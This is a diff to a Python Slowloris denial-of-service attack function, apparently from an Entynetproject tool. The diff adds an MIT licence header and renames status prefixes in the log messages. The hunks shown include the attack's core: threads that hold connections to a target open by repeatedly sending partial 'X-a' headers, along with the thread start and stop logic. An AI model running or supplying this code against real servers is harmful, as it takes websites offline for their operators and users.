@@ -1,3 +1,27 @@
+#!/usr/bin/env python3
+
+# MIT License
+#
+# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+
 import random
 import time
 import socket
@@ -13,7 +37,7 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("[#] Attack started for " + str(attack_time) + " seconds...")
+	print("[BEGIN] Attack started for " + str(attack_time) + " seconds...")
 	
 	threads_list = []
 
@@ -35,13 +59,13 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 				try:
 					sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
 				except socket.error:
-					print("[-] Failed..")
+					print("[ERROR] Failed!")
 				else:
-					print("[+] Sending to " + target)
+					print("[BEGIN] Sending to " + target + "...")
 
 	# Start threads
 	for thread in range(0, threads):
-		print("[#] Starting thread " + str(thread) + "...")
+		print("[BEGIN] Starting thread " + str(thread) + "...")
 		t = Thread(target = slowloris_flood)
 		t.start()
 		threads_list.append(t)
@@ -52,4 +76,4 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 		FINISH = True
 		thread.join()
 	
-	print("[!] SLOWLORIS attack stopped!")
+	print("[WARNING] SLOWLORIS attack stopped!")
